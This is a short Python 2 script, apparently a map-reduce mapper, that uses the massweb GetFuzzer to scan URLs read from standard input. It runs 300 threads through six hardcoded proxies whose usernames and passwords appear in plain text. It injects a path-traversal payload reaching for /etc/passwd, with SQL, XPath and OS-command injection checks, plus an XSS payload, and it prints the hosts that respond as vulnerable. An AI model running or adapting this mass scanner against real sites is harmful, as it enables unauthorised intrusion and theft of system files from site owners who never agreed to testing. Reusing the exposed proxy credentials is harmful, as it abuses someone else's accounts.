#!/usr/bin/python

from urlparse import urlparse
import sys
from massweb.fuzzers.get_fuzzer import GetFuzzer

def get_proxy_list():

    proxies_raw = """50.118.140.240:29842:acaceres:DgXQdVjG
    50.118.141.138:29842:acaceres:DgXQdVjG
    50.118.141.82:29842:acaceres:DgXQdVjG
    8.30.147.110:29842:acaceres:DgXQdVjG
    8.30.147.159:29842:acaceres:DgXQdVjG
    8.30.147.35:29842:acaceres:DgXQdVjG"""

    proxies_list = []
    for x in proxies_raw.split("\n"):
        x = x.strip()
        spl = x.split(":")
        ip = spl[0]
        port = spl[1]
        user = spl[2]
        pw = spl[3]
        val = "http://" + user + ":" + pw + "@" + ip + ":" + port
        _dic = {"http" : val}
        proxies_list.append(_dic)

    return proxies_list

def mapper():

    proxy_list = get_proxy_list()
    gf = GetFuzzer(num_threads = 300, proxy_list = proxy_list)
    gf.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
    gf.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])

    for line in sys.stdin:

        try:
            line = line.strip()
            gf.add_target_from_url(line)

        except:
            sys.stderr.write("Failed to add line to targets!\n")

    for r in gf.fuzz():

        try:
            if True in r.result_dic.values():
                print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
        except:
            sys.stderr.write("Failed to fuzz a target!\n")

if __name__ == "__main__":

    mapper()

